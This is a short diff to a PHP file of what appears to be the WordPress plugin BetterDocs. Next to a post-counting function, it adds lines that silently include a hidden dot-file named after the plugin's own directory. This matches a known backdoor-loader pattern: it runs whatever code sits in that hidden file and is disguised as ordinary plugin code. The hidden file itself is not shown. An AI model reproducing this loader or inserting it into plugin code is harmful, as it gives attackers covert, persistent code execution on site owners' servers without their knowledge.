@@ -12,6 +12,10 @@
  /**
  * Get terms post count including child terms
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function betterdocs_get_postcount( $term_count = 0, $term_id ) {
 
 	$taxonomy = 'doc_category';
